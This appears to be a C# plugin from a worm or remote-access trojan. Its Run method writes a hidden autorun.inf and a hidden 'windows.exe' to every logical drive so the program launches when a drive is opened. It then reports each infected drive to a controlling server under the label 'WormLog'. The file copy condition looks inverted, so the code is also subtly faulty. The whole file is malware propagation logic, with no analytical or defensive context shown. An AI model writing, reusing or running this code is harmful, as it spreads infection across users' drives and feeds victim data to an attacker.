using System;
using System.Diagnostics;
using System.IO;
using Leb128;
using Plugin.Helper;

namespace Plugin.Old;

internal class LogicDriversAutoRuns
{
	public static void Run()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text in logicalDrives)
			{
				if (File.Exists(text + "windows.exe"))
				{
					File.Copy(Process.GetCurrentProcess().MainModule.FileName, text + "windows.exe");
				}
				StreamWriter streamWriter = new StreamWriter(text + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open = windows.exe");
				streamWriter.WriteLine("shellexecute=windows.exe");
				streamWriter.Close();
				File.SetAttributes(text + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(text + "windows.exe", FileAttributes.Hidden);
				Client.Send(LEB128.Write(new object[2]
				{
					"WormLog",
					"LogicDriversAutoRuns: Copy to " + text + "[autorun.inf],[windows.exe]"
				}));
			}
		}
		catch (Exception)
		{
		}
	}
}
